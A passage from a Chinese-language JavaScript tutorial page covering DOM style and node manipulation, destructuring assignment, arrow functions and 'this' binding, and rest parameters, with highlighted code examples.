javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 设置元素的显示方式为隐藏</span></span><br><span class="line">element.<span class="property">style</span>.<span class="property">display</span> = <span class="string">"none"</span>;</span><br></pre></td></tr></tbody></table></figure><ol><li><code>border</code>：设置元素的边框样式。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 设置元素的边框样式为实线，宽度为1像素，颜色为黑色</span></span><br><span class="line">element.<span class="property">style</span>.<span class="property">border</span> = <span class="string">"1px solid black"</span>;</span><br></pre></td></tr></tbody></table></figure><p>通过修改元素的<code>style</code>属性，可以实现对元素样式的动态修改和控制。</p><p>例如，可以通过JavaScript来实现鼠标悬停时改变元素背景颜色的效果：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">html复制代码&lt;div id=<span class="string">"myElement"</span>&gt;<span class="title class_">Hover</span> over me&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// 获取元素</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">let</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'myElement'</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// 添加鼠标悬停事件监听器</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  element.<span class="title function_">addEventListener</span>(<span class="string">'mouseover'</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 改变元素背景颜色为红色</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    element.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">"red"</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  });</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="comment">// 添加鼠标离开事件监听器</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  element.<span class="title function_">addEventListener</span>(<span class="string">'mouseout'</span>, <span class="keyword">function</span>(<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">// 改变元素背景颜色为默认颜色</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    element.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">""</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  });</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><p>在上面的例子中，当鼠标悬停在元素上时，通过修改元素的<code>style</code>属性来改变元素的背景颜色为红色；当鼠标离开元素时，将背景颜色恢复为默认颜色。这样就实现了鼠标悬停时改变元素样式的效果。</p><h5 id="15-获取属性"><a href="#15-获取属性" class="headerlink" title="15.获取属性"></a>15.获取属性</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">用户名称:<span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"user"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">"哈哈哈"</span> <span class="attr">size</span>=<span class="string">"30px"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">let</span> attribute = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"user"</span>).<span class="title function_">getAttribute</span>(<span class="string">"size"</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"user"</span>).<span class="title function_">setAttribute</span>(<span class="string">"value"</span>,<span class="string">"哈哈哈"</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">console</span>.<span class="title function_">log</span>(attribute);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="16-创建或添加节点"><a href="#16-创建或添加节点" class="headerlink" title="16.创建或添加节点"></a>16.创建或添加节点</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"u"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"two"</span>&gt;</span>world<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">let</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">"li"</span>); <span class="comment">// 创建节点</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    li.<span class="property">innerHTML</span> = <span class="string">"hello world"</span>; <span class="comment">//节点添加内容</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"u"</span>).<span class="title function_">appendChild</span>(li); <span class="comment">// 将节点插入另一个节点的子节点里</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">let</span> parentElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"u"</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    parentElement.<span class="title function_">insertBefore</span>(li,two);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="comment">//需要添加子节点的父节点.插入当前节点的上方(需要插入的子节点,在哪个节点的上方)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">let</span> node = li.<span class="title function_">cloneNode</span>(<span class="literal">true</span>); <span class="comment">// 克隆节点 格式被克隆的节点,cloneNode(是否克隆子节点)</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    parentElement.<span class="title function_">appendChild</span>(node); <span class="comment">//将克隆节点添加到父节点中最后一个子节点</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="17-添加替换"><a href="#17-添加替换" class="headerlink" title="17.添加替换"></a>17.添加替换</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"u"</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"two"</span>&gt;</span>world<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">let</span> e = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"two"</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"u"</span>).<span class="title function_">removeChild</span>(e);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="18-滚动"><a href="#18-滚动" class="headerlink" title="18.滚动"></a>18.滚动</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">"box"</span> style=<span class="string">"overflow: auto; height: 200px;"</span>&gt;</span><br><span class="line">    &lt;!-- 这里是滚动内容 --&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="keyword">let</span> elementById = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">'box'</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="keyword">let</span> scrollTop = elementById.<span class="property">scrollTop</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="keyword">let</span> scrollLeft = elementById.<span class="property">scrollLeft</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"顶部滚动条:"</span> + scrollTop);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"左边滚动条:"</span> + scrollLeft);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"> },<span class="number">2000</span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></tbody></table></figure><h5 id="19-数组解构"><a href="#19-数组解构" class="headerlink" title="19.数组解构"></a>19.数组解构</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//可嵌套</span></span><br><span class="line">  <span class="keyword">let</span>[a,[[b],c]] = [<span class="number">1</span>,[[<span class="number">2</span>],<span class="number">3</span>]];</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br><span class="line">  <span class="comment">//可忽略</span></span><br><span class="line">  <span class="keyword">let</span> [a1,b1] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a1);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b1);</span><br><span class="line">  <span class="comment">//不完全解构</span></span><br><span class="line">  <span class="keyword">let</span>[a2,b2] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a2);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b2);</span><br><span class="line">  <span class="keyword">let</span> [a3,[b3],c3] = [<span class="number">1</span>,[<span class="number">2</span>,<span class="number">3</span>],<span class="number">4</span>]</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a3);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b3);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(c3);</span><br><span class="line">  <span class="comment">//剩余运算符</span></span><br><span class="line">  <span class="keyword">let</span>[a4,...b4] = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(a4);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b4);</span><br><span class="line">  <span class="comment">//解构默认值</span></span><br><span class="line">  <span class="keyword">let</span> [x,y = <span class="string">'b'</span>] = [<span class="string">'a'</span>];</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(y);</span><br></pre></td></tr></tbody></table></figure><h5 id="20-对象解构"><a href="#20-对象解构" class="headerlink" title="20.对象解构"></a>20.对象解构</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> {bar,foo} = {<span class="attr">foo</span>:<span class="string">"ECMAScript 6.0"</span>,<span class="attr">bar</span>:<span class="string">"hello"</span>};</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(bar); <span class="comment">//结果hello</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(foo); <span class="comment">//结果ECMAScript 6.0</span></span><br><span class="line">    <span class="keyword">let</span>{abc} = {<span class="attr">foo</span>:<span class="string">"ECMAScript 6.0"</span>,<span class="attr">bar</span>:<span class="string">"hello"</span>};</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(abc); <span class="comment">//结果无</span></span><br><span class="line">    <span class="keyword">let</span> {a} = {<span class="attr">a</span>:<span class="string">"a"</span>};</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line">    <span class="keyword">let</span> {<span class="attr">a</span>:aa = <span class="number">10</span>,<span class="attr">b</span>:bb = <span class="number">20</span>} = {<span class="attr">a</span>:<span class="number">5</span>};</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(aa); <span class="comment">//只有输出aa才能出现结果 输入a则不行</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(bb);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure><h5 id="21-其他解构赋值"><a href="#21-其他解构赋值" class="headerlink" title="21.其他解构赋值"></a>21.其他解构赋值</h5><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//字符串解构赋值</span></span><br><span class="line">    <span class="keyword">const</span> [a,b,c,d] = <span class="string">'yes'</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(c);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(d);<span class="comment">// 超出的变量不存在</span></span><br><span class="line">    <span class="comment">//函数参数解构赋值</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">x,y</span>) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x + y);</span><br><span class="line">    }</span><br><span class="line">    <span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//其二</span></span><br><span class="line"> <span class="keyword">function</span> <span class="title function_">move1</span>(<span class="params">{x = <span class="number">0</span>,y = <span class="number">0</span>} = {}</span>) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>([x,y]);</span><br><span class="line">    }</span><br><span class="line">    <span class="title function_">move1</span>({<span class="attr">x</span>:<span class="number">3</span>,<span class="attr">y</span>:<span class="number">8</span>}); <span class="comment">//[3,8]</span></span><br><span class="line">    <span class="title function_">move1</span>({<span class="attr">x</span>:<span class="number">3</span>}); <span class="comment">//[3,0] y没有传值，默认是0</span></span><br><span class="line">    <span class="title function_">move1</span>({}); <span class="comment">//[0,0]</span></span><br><span class="line">    <span class="title function_">move1</span>(); <span class="comment">//[0.0]</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">move</span>(<span class="params">{x,y} = {x:<span class="number">0</span>,y:<span class="number">0</span>}</span>) {</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x,y)</span><br><span class="line">    }</span><br><span class="line">    <span class="title function_">move</span>({<span class="attr">x</span>:<span class="number">3</span>,<span class="attr">y</span>:<span class="number">8</span>}); <span class="comment">//[3,8]</span></span><br><span class="line">    <span class="title function_">move</span>({<span class="attr">x</span>:<span class="number">3</span>}); <span class="comment">//[3,undefined]</span></span><br><span class="line">    <span class="title function_">move</span>({}); <span class="comment">//[undefined,undefined]</span></span><br><span class="line">    <span class="title function_">move</span>(); <span class="comment">//[0,0]</span></span><br><span class="line"><span class="comment">//默认值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x,y</span>) {</span><br><span class="line">        y = y || <span class="string">'world'</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(x,y);</span><br><span class="line">    }</span><br><span class="line">    <span class="title function_">foo</span>(<span class="string">'hello'</span>); <span class="comment">//hello world</span></span><br><span class="line">    <span class="title function_">foo</span>(<span class="string">'hello'</span>,<span class="string">'es6'</span>); <span class="comment">//hello es6</span></span><br><span class="line">    <span class="title function_">foo</span>(<span class="string">'hello'</span>,<span class="string">''</span>) <span class="comment">//hello world</span></span><br><span class="line">    <span class="comment">//没传值的情况下回调用默认值;</span></span><br></pre></td></tr></tbody></table></figure><h5 id="22-总结"><a href="#22-总结" class="headerlink" title="22.总结"></a>22.总结</h5><p>当我们处理复杂的数据结构时，JavaScript提供了一些方便的语法来解析和解构数据。以下是一些常见的解析和解构技术：</p><h6 id="22-1-数组解析（Array-Destructuring）："><a href="#22-1-数组解析（Array-Destructuring）：" class="headerlink" title="22.1.数组解析（Array Destructuring）："></a>22.1.数组解析（Array Destructuring）：</h6><p>可以通过将数组的元素赋值给变量来解析数组。这样可以方便地访问和操作数组中的元素。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 数组解析</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> [a, b, c] = arr;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c); <span class="comment">// 输出：1 2 3</span></span><br></pre></td></tr></tbody></table></figure><h6 id="22-2-解析赋值（Object-Destructuring）："><a href="#22-2-解析赋值（Object-Destructuring）：" class="headerlink" title="22.2.解析赋值（Object Destructuring）："></a>22.2.解析赋值（Object Destructuring）：</h6><p>可以通过将对象的属性赋值给变量来解析对象。这样可以方便地访问和操作对象的属性。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 解析赋值</span></span><br><span class="line"><span class="keyword">let</span> obj = {<span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">2</span>};</span><br><span class="line"><span class="keyword">let</span> {x, y} = obj;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x, y); <span class="comment">// 输出：1 2</span></span><br></pre></td></tr></tbody></table></figure><h6 id="22-3-函数参数解构赋值（Function-Parameter-Destructuring）："><a href="#22-3-函数参数解构赋值（Function-Parameter-Destructuring）：" class="headerlink" title="22.3.函数参数解构赋值（Function Parameter Destructuring）："></a>22.3.函数参数解构赋值（Function Parameter Destructuring）：</h6><p>可以在函数参数中使用解构赋值的语法，方便地从传入的对象中提取所需的属性。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 函数参数解构赋值</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params">{x, y} = {x: <span class="number">0</span>, y: <span class="number">0</span>}</span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x, y);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="title function_">move</span>({<span class="attr">x</span>: <span class="number">10</span>, <span class="attr">y</span>: <span class="number">20</span>}); <span class="comment">// 输出：10 20</span></span><br><span class="line"><span class="title function_">move</span>(); <span class="comment">// 输出：0 0</span></span><br></pre></td></tr></tbody></table></figure><h6 id="22-4字符串解构赋值（String-Destructuring）："><a href="#22-4字符串解构赋值（String-Destructuring）：" class="headerlink" title="22.4字符串解构赋值（String Destructuring）："></a>22.4字符串解构赋值（String Destructuring）：</h6><p>可以将字符串解析为单个字符，并将其赋值给变量。</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串解构赋值</span></span><br><span class="line"><span class="keyword">let</span> str = <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">let</span> [a, b, c, d, e] = str;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, c, d, e); <span class="comment">// 输出：h e l l o</span></span><br></pre></td></tr></tbody></table></figure><p>这些解析和解构技术可以帮助我们更方便地处理复杂的数据结构，提高代码的可读性和可维护性。</p><h5 id="23-箭头函数"><a href="#23-箭头函数" class="headerlink" title="23.箭头函数"></a>23.箭头函数</h5><p>箭头函数是ES6引入的一种新的函数定义方式，它提供了一种更简洁的语法来定义函数。箭头函数使用箭头（=&gt;）来分隔参数和函数体，并且没有自己的<code>this</code>、<code>arguments</code>、<code>super</code>或<code>new.target</code>绑定。</p><p>以下是箭头函数的一些特点和示例：</p><ol><li>简洁的语法：箭头函数可以使用更简洁的语法来定义函数。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 传统函数定义方式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) {</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数定义方式</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; a + b;</span><br></pre></td></tr></tbody></table></figure><ol><li>隐式返回：如果箭头函数只有一行代码，可以省略<code>return</code>关键字，并且该行代码的结果将自动作为返回值。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 传统函数定义方式</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">multiply</span>(<span class="params">a, b</span>) {</span><br><span class="line">  <span class="keyword">return</span> a * b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数定义方式</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">multiply</span> = (<span class="params">a, b</span>) =&gt; a * b;</span><br></pre></td></tr></tbody></table></figure><ol><li>箭头函数没有自己的<code>this</code>绑定：箭头函数没有自己的<code>this</code>绑定，它会继承外部作用域的<code>this</code>值。</li></ol><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 传统函数定义方式</span></span><br><span class="line"><span class="keyword">const</span> obj = {</span><br><span class="line">  <span class="attr">name</span>: <span class="string">'John'</span>,</span><br><span class="line">  <span class="attr">sayHello</span>: <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'Hello, '</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">// 箭头函数定义方式</span></span><br><span class="line"><span class="keyword">const</span> obj = {</span><br><span class="line">  <span class="attr">name</span>: <span class="string">'John'</span>,</span><br><span class="line">  <span class="attr">sayHello</span>: <span class="keyword">function</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">'Hello, '</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    }, <span class="number">1000</span>);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>在上面的例子中，箭头函数在<code>setTimeout</code>中使用，它继承了外部作用域（<code>obj</code>对象）的<code>this</code>值，而不是创建自己的<code>this</code>。</p><p>箭头函数的简洁语法和继承外部作用域的<code>this</code>特性使其在编写简单、清晰的代码时非常有用。然而，需要注意的是，箭头函数不适用于所有情况，特别是在需要使用<code>this</code>、<code>arguments</code>等特殊变量时。</p><p>箭头函数的出现主要是为了解决传统函数中<code>this</code>指向的问题。在传统函数中，<code>this</code>的值是在运行时动态确定的，它取决于函数的调用方式。这经常导致<code>this</code>的值在不同的上下文中发生变化，给开发者带来了困惑和错误。</p><p>箭头函数没有自己的<code>this</code>绑定，它会继承外部作用域的<code>this</code>值。这意味着箭头函数的<code>this</code>值是在定义时确定的，而不是在运行时确定的。箭头函数会捕获定义时的上下文，并将其作为自己的<code>this</code>值。</p><p>这种特性使得箭头函数在处理<code>this</code>时更加直观和可靠。它可以避免<code>this</code>值的意外变化，并且更容易理解和使用。</p><p>在传统函数中，匿名函数的<code>this</code>值通常会发生变化，因为它的调用方式可能是通过其他对象的方法调用，或者作为回调函数传递给其他函数。而箭头函数的<code>this</code>值是继承自外部作用域的，不会发生变化。</p><p>因此，箭头函数的出现确实解决了匿名函数中<code>this</code>指向的问题，使得开发者在处理<code>this</code>时更加方便和可靠。</p><p>函数指向例子</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = {</span><br><span class="line">       <span class="string">'user'</span>:<span class="string">'小若'</span>,</span><br><span class="line">       <span class="string">'age'</span>: <span class="number">18</span>,</span><br><span class="line">       <span class="string">'sayHello'</span>:<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">           <span class="keyword">let</span> self=<span class="variable language_">this</span>; <span class="comment">//直接用this因为指向原因无法读取到person里的所以</span></span><br><span class="line">           <span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">               <span class="variable language_">console</span>.<span class="title function_">log</span>(self.<span class="property">user</span> + self.<span class="property">age</span>)</span><br><span class="line">           },<span class="number">1000</span>)</span><br><span class="line">       }</span><br><span class="line">   };</span><br><span class="line">   person.<span class="title function_">sayHello</span>();</span><br></pre></td></tr></tbody></table></figure><p>如果使用</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">user</span> + <span class="variable language_">this</span>.<span class="property">age</span>)</span><br></pre></td></tr></tbody></table></figure><p>因为指向问题无法获取到user 和 age 所以需要使用 self=this来指向person作用域里的变量</p><p>或者</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = {</span><br><span class="line">    <span class="string">'user'</span>: <span class="string">'小若'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="string">'sayHello'</span>: <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">        <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">user</span> + <span class="variable language_">this</span>.<span class="property">age</span>)</span><br><span class="line">        }, <span class="number">1000</span>)</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line">person.<span class="title function_">sayHello</span>();</span><br></pre></td></tr></tbody></table></figure><p>在箭头函数中，this会继承自外部作用域，因此在setInterval的回调函数中，this仍然指向person对象。这样就可以成功输出结果。</p><h5 id="24-rest参数"><a href="#24-rest参数" class="headerlink" title="24.rest参数"></a>24.rest参数</h5><p>在JavaScript中，rest参数是一种特殊的函数参数，它允许我们将不确定数量的参数作为一个数组传递给函数。通过使用三个点（…）前缀来定义rest参数。</p><p>rest参数的语法如下：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">functionName</span>(<span class="params">...rest</span>) {</span><br><span class="line">  <span class="comment">// 函数体</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>当函数被调用时，传递给函数的所有参数都会被收集到rest参数中，并作为一个数组传递给函数体。这样我们就可以在函数内部使用这个数组来处理参数。</p><p>下面是一个使用rest参数的示例：</p><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">...numbers</span>) {</span><br><span class="line">  <span class="keyword">let</span> total = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> number <span class="keyword">of</span> numbers) {</span><br><span class="line">    total += number;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> total;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)); <span class="comment">// 输出 6</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span 